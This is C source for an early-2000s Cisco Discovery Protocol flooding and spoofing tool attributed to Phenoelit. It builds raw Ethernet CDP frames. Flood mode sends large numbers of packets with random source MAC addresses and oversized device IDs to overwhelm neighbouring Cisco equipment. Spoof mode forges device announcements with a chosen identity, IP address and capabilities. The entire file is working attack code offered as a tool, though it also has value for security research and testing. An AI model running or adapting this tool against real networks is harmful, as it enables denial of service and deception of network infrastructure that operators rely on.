/* CDP sender/flooder
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de)
 * (c) 2k
 *
 * $Id: cdp.c,v 1.9 2001/06/16 18:17:31 fx Exp $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <errno.h>


/* my stuff instead of libpacket */
#include "protocols.h"
#include "packets.h"


#define IP_ALEN		IP_ADDR_LEN

/* my config */
#define DEFAULT_NUMBER	100;
#define DEFAULT_LENGTH  1400;
struct {
    char		*device;
    int			verbose;
    int			mode;
    /* flood mode */
    unsigned long	number;
    int			length;
    char		floodchar;
    int			floodrandom;
    /* spoof mode */
    char		*S_devname;
    char		*S_portid;
    char		*S_software;
    char		*S_platform;
    char		*S_capas;
    struct in_addr	S_ipaddr;
} cfg;

/* globals */
u_char			CDP_DEST[6] = {0x1,0x0,0xC,0xCC,0xCC,0xCC};

int			atsock;		/* attack socket */
#define CDP_FRAME_SIZE	1700
u_char			cdpframe[CDP_FRAME_SIZE];


/* prototypes */
unsigned int	mk_flood_cdp(char *my_name,int nlen);
unsigned int	mk_spoof_cdp(void);

void usage(char *n);

/* ******************* MAIN ******************** */

int main(int argc,char **argv) {
    char		option;
    extern char		*optarg;

    unsigned int	plen;
    unsigned int	i;

    /* for flooding */
    int			j;
    char		*devname;
    struct timespec	sleeper = {0,10000};

    memset(&cfg,0,sizeof(cfg));
    while ((option=getopt(argc,argv,"vi:n:l:m:c:rD:P:C:L:S:F:"))!=EOF) {
	switch (option) {
	    /* general */
	    case 'v':	cfg.verbose++;
			break;
	    case 'i':	cfg.device=smalloc(strlen(optarg));
			strcpy(cfg.device,optarg);
			break;
	    case 'm':	cfg.mode=atol(optarg);
			if (cfg.mode==0) 
			    printf("Running in flood mode\n");
			else if (cfg.mode==1) 
			    printf("Running in spoof mode\n");
			else {
			    printf("Mode should be 0 or 1\n");
			    exit(1);
		        }
			break;

	    /* flood mode */
	    case 'n':	if ((cfg.number=atol(optarg))<=0) {
			    fprintf(stderr,"This number is bullshit\n");
			    exit(1);
			}
			break;
	    case 'l':	if ((cfg.length=atol(optarg))<=0) {
			    fprintf(stderr, "This length is bullshit\n");
			    exit(1);
			}
			break;
	    case 'c':	cfg.floodchar=optarg[0];
			break;
	    case 'r':	cfg.floodrandom++;
			break;

	    /* Spoof mode */
	    case 'D':	cfg.S_devname=(char *)smalloc(strlen(optarg)+1);
			strcpy(cfg.S_devname,optarg);
			break;
	    case 'P':	cfg.S_portid=(char *)smalloc(strlen(optarg)+1);
			strcpy(cfg.S_portid,optarg);
			break;
	    case 'C':	cfg.S_capas=(char *)smalloc(strlen(optarg)+1);
			strcpy(cfg.S_capas,optarg);
			break;
	    case 'L':	cfg.S_platform=(char *)smalloc(strlen(optarg)+1);
			strcpy(cfg.S_platform,optarg);
			break;
	    case 'S':	cfg.S_software=(char *)smalloc(strlen(optarg)+1);
			strcpy(cfg.S_software,optarg);
			break;
	    case 'F':	if (!inet_aton(optarg,&(cfg.S_ipaddr))) {
			    fprintf(stderr,"source IP is invalid\n");
			    exit (1);
			}
			break;

	    /* fallback */
	    default:	usage(argv[0]);
	}
    }

    if (!cfg.device) usage(argv[0]);

    /* check command line */
    if (cfg.number==0) cfg.number=DEFAULT_NUMBER;
    if (cfg.length==0) cfg.length=DEFAULT_LENGTH;
    if (cfg.floodchar=='\0') cfg.floodchar='A';



    if (cfg.mode==0) {
	/* ******************* FLOOD MODE ***************** */
	devname=(char *)smalloc(cfg.length);

	if ((atsock=init_socket_eth(cfg.device))<=0) exit(1);

	srand((unsigned int)time(NULL));
	
	for (i=0;i<cfg.number;i++) {

	    for (j=0;j<cfg.length;j++) {
		if (cfg.floodrandom) {
		    devname[j]=cfg.floodchar+
			(int) (128.0*rand()/(RAND_MAX+1.0));
		} else {
		    devname[j]=cfg.floodchar;
		}
	    }
	    
	    plen=mk_flood_cdp(devname,cfg.length-1);
	    if (cfg.verbose) 
		printf("Packet length: %d\n",plen);
	    sendpack_eth(cfg.device,atsock,cdpframe,plen);

	    nanosleep(&sleeper,NULL);
	}

	close(atsock);
	
    } else {
	/* ******************* SPOOF MODE ***************** */
	if (!((cfg.S_devname!=NULL) 
		    && (cfg.S_portid!=NULL)
		    && (cfg.S_capas!=NULL) 
		    && (cfg.S_platform!=NULL)
		    && (cfg.S_software!=NULL))) {
	    fprintf(stderr,"For spoofing, the following options"
		    " are required:\n"
		    "\t -D -P -C -L -S -F\n"
		    );
	    exit (1);
	}

	if (cfg.verbose) 
	    printf("Spoofing mode with the following data:\n"
		    "Device ID :\t%s\n"
		    "IP address:\t%s\n"
		    "Platform  :\t%s\n"
		    "Capabilities:\t%s\n"
		    "Port ID   :\t%s\n"
		    "Software  :\t%s\n",
		    cfg.S_devname,inet_ntoa(cfg.S_ipaddr),cfg.S_platform,
		    cfg.S_capas,cfg.S_portid,cfg.S_software);

	/* go .. */
	if ((atsock=init_socket_eth(cfg.device))<=0) exit(1);
	plen=mk_spoof_cdp();
	if (cfg.verbose) 
	    printf("Packet length: %d\n",plen);
	sendpack_eth(cfg.device,atsock,cdpframe,plen);
	close(atsock);
    }

    return 0;
}


unsigned int	mk_flood_cdp(char *my_name,int nlen) {
    /* semi constants for memcpy */
    u_char	my_portid[]	= "F";
    
    struct eth_ieee802_3	*ethh;
    struct eth_LLC		*llc;
    struct cdphdr		*cdph;
    struct cdp_device		*cdp_dev;
    struct cdp_port		*cdp_prt;
    u_char			*cdp_end;
    u_int16_t			cs;

    int				j;
    struct ether_addr		ea;


    memset(&cdpframe,0,sizeof(cdpframe));
    
    /* created random sender address */
    for (j=0;j<ETH_ALEN;j++)
	ea.ether_addr_octet[j]=1+(int) (255.0*rand()/(RAND_MAX+1.0));

    /* make IEEE 802.3 header */
    ethh=(struct eth_ieee802_3 *)cdpframe;
    memcpy(&(ethh->saddr),&ea,ETH_ALEN);
    memcpy(&(ethh->daddr),&CDP_DEST,ETH_ALEN);
    ethh->length=0;	/* assigned later */

    /* build LLC header */
    llc=(struct eth_LLC *)(cdpframe+sizeof(struct eth_ieee802_3));
    llc->DSAP=0xAA;
    llc->SSAP=0xAA;
    llc->Control=0x03;	/* unnumbered */
    llc->orgcode[0]=llc->orgcode[1]=0x00;
    llc->orgcode[2]=0x0c;			/* cisco */
    llc->proto=htons(0x2000);

    /* build cdp header */
    cdph=(struct cdphdr *)((void*)llc+sizeof(struct eth_LLC));
    cdph->version=0x01;
    cdph->ttl=255;		/* in seconds */
    cdph->checksum=0x0000;	/* will be computed later */
    
    /* make a device entry */
    cdp_dev=(struct cdp_device *)((void *)cdph+sizeof(struct cdphdr));
    cdp_dev->type=htons(TYPE_DEVICE_ID);		/* 0x0001 */
    cdp_dev->length=htons(nlen+2*sizeof(u_int16_t));
    memcpy(&(cdp_dev->device),my_name,nlen);

    /* make CDP port entry */
    cdp_prt=(struct cdp_port *)((void *)cdp_dev+(
	    sizeof(u_int16_t) /* type */ + sizeof(u_int16_t) /* length */ +
	    nlen));
    cdp_prt->type=htons(TYPE_PORT_ID);
    cdp_prt->length=htons(strlen(my_portid)+2*sizeof(u_int16_t));
    memcpy(&(cdp_prt->port),&my_portid,strlen(my_portid));


    cdp_end=(void *)(((void *)cdp_prt+(
		sizeof(u_int16_t) /* type */ + sizeof(u_int16_t) /* length */ +
		strlen(my_portid))));
    ethh->length=htons((unsigned int)((void *)cdp_end-(void *)llc));


    cs=chksum((u_char *)cdph,((void *)cdp_end-(void *)cdph));
    if (cfg.verbose>2) 
	printf("My checksum is %04X\n",cs);
    cdph->checksum=cs;
   
    return ((void *)cdp_end-(void *)&cdpframe[0]);
}


unsigned int	mk_spoof_cdp() {
    struct eth_ieee802_3	*ethh;
    struct eth_LLC		*llc;
    struct cdphdr		*cdph;
    struct cdp_device		*cdp_dev;
    struct cdp_address		*cdp_addr;
    struct cdp_address_entry	*cdp_ae;
    struct cdp_port		*cdp_prt;
    struct cdp_capabilities	*cdp_caps;
    struct cdp_software		*cdp_soft;
    struct cdp_platform		*cdp_plt;
    u_char			*cdp_end;
    u_int16_t			cs;


    memset(&cdpframe,0,sizeof(cdpframe));
    
    /* make IEEE 802.3 header */
    ethh=(struct eth_ieee802_3 *)cdpframe;
    memcpy(&(ethh->saddr),&(packet_ifconfig.eth),ETH_ALEN);
    memcpy(&(ethh->daddr),&CDP_DEST,ETH_ALEN);
    ethh->length=0;	/* assigned later */

    /* build LLC header */
    llc=(struct eth_LLC *)(cdpframe+sizeof(struct eth_ieee802_3));
    llc->DSAP=0xAA;
    llc->SSAP=0xAA;
    llc->Control=0x03;	/* unnumbered */
    llc->orgcode[0]=llc->orgcode[1]=0x00;
    llc->orgcode[2]=0x0c;			/* cisco */
    llc->proto=htons(0x2000);

    /* build cdp header */
    cdph=(struct cdphdr *)((void*)llc+sizeof(struct eth_LLC));
    cdph->version=0x01;
    cdph->ttl=255;		/* in seconds */
    cdph->checksum=0x0000;	/* should be computed */
    
    /* make a device entry */
    cdp_dev=(struct cdp_device *)((void *)cdph+sizeof(struct cdphdr));
    cdp_dev->type=htons(TYPE_DEVICE_ID);		/* 0x0001 */
    cdp_dev->length=htons(strlen(cfg.S_devname)+2*sizeof(u_int16_t));
    memcpy(&(cdp_dev->device),cfg.S_devname,strlen(cfg.S_devname)); 

    /* make an address entry */
    cdp_addr=(struct cdp_address *)((void *)cdp_dev+(
	    sizeof(u_int16_t) /* type */ + sizeof(u_int16_t) /* length */ +
	    strlen(cfg.S_devname)));
    cdp_addr->type=htons(TYPE_ADDRESS);
    cdp_addr->length=htons(
	    /* address record */       /* address entry */ /*size of IPaddr-1 */
	    sizeof(struct cdp_address)+sizeof(struct cdp_address_entry)+3);
    cdp_addr->number=htonl(0x00000001);

    /* insert our address */
    cdp_ae=(struct cdp_address_entry *)((void *)cdp_addr+sizeof(struct cdp_address));
    cdp_ae->proto_type=0x01;
    cdp_ae->length=0x01;
    cdp_ae->proto=0xCC;		/* IPv4 */
    cdp_ae->addrlen[1]=0x04;
    memcpy(&(cdp_ae->addr),&(cfg.S_ipaddr),IP_ALEN);

    /* make CDP port entry */
    cdp_prt=(struct cdp_port *)((void *)cdp_ae+
	(sizeof (struct cdp_address_entry)+3)); /* for IP fields */ 
    cdp_prt->type=htons(TYPE_PORT_ID);
    cdp_prt->length=htons(strlen(cfg.S_portid)+2*sizeof(u_int16_t));
    memcpy(&(cdp_prt->port),cfg.S_portid,strlen(cfg.S_portid));

    /* make CDP capabilities entry */
    cdp_caps=(struct cdp_capabilities *)((void *)cdp_prt+(
	    sizeof(u_int16_t) /* type */ + sizeof(u_int16_t) /* length */ +
	    strlen(cfg.S_portid)));
    cdp_caps->type=htons(TYPE_CAPABILITIES);
    cdp_caps->length=htons(0x0008);
    	/* I'm sorry, this is lazy and not very elegant but it works 
	 * and at the moment, nothing else comes to my mind ... */
    cdp_caps->capab=0;
    if (strchr(cfg.S_capas,'R')) 
	cdp_caps->capab=CDP_CAP_LEVEL3_ROUTER;
    if (strchr(cfg.S_capas,'T')) 
	cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL2_TRBR;
    if (strchr(cfg.S_capas,'B')) 
	cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL2_SRB;
    if (strchr(cfg.S_capas,'S')) 
	cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL2_SWITCH;
    if (strchr(cfg.S_capas,'H')) 
	cdp_caps->capab=cdp_caps->capab | CDP_CAP_NETWORK_LAYER;
    if (strchr(cfg.S_capas,'I')) 
	cdp_caps->capab=cdp_caps->capab | CDP_CAP_FORWARD_IGMP;
    if (strchr(cfg.S_capas,'r')) 
	cdp_caps->capab=cdp_caps->capab | CDP_CAP_LEVEL1;
    cdp_caps->capab=htonl(cdp_caps->capab);

    /* make CDP software version */
    cdp_soft=(struct cdp_software *)((void *)cdp_caps+
	    sizeof(struct cdp_capabilities));
    cdp_soft->type=htons(TYPE_IOS_VERSION);
    cdp_soft->length=htons(strlen(cfg.S_software)+2*sizeof(u_int16_t));
    memcpy(&(cdp_soft->software),cfg.S_software,strlen(cfg.S_software));

    /* make CDP platform */
    cdp_plt=(struct cdp_platform *)((void *)cdp_soft+(
	    sizeof(u_int16_t) /* type */ + sizeof(u_int16_t) /* length */ +
	    strlen(cfg.S_software)));
    cdp_plt->type=htons(TYPE_PLATFORM);
    cdp_plt->length=htons(strlen(cfg.S_platform)+2*sizeof(u_int16_t));
    memcpy(&(cdp_plt->platform),cfg.S_platform,strlen(cfg.S_platform));
    cdp_end=(u_char *)((void *)cdp_plt+(
	    sizeof(u_int16_t) /* type */ + sizeof(u_int16_t) /* length */ +
	    strlen(cfg.S_platform)));

    ethh->length=htons((unsigned int)((void *)cdp_end-(void *)llc));


    cs=chksum((u_char *)cdph,((void *)cdp_end-(void *)cdph));
    if (cfg.verbose>2) 
	printf("My checksum is %04X\n",cs);
    cdph->checksum=cs;
   
    return ((void *)cdp_end-(void *)&cdpframe[0]);
}

void usage(char *n) {
    printf(
	    "%s [-v] -i <interface> -m {0,1} ...\n"
	    "\n"
	    "Flood mode (-m 0):\n"
	    "-n <number>\tnumber of packets\n"
	    "-l <number>\tlength of the device id\n"
	    "-c <char>\tcharacter to fill in device id\n"
	    "-r\t\trandomize device id string\n"
	    "\n"
	    "Spoof mode (-m 1):\n"
	    "-D <string>\tDevice id\n"
	    "-P <string>\tPort id\n"
	    "-L <string>\tPlatform\n"
	    "-S <string>\tSoftware\n"
	    "-F <string>\tIP address\n"
	    "-C <capabilities>\n"
	    "\tthese are:\n"
	    "\tR - Router, T - Trans Bridge, B - Source Route Bridge\n"
	    "\tS - Switch, H - Host, I - IGMP, r - Repeater\n",
	    n);
    exit(0);
}
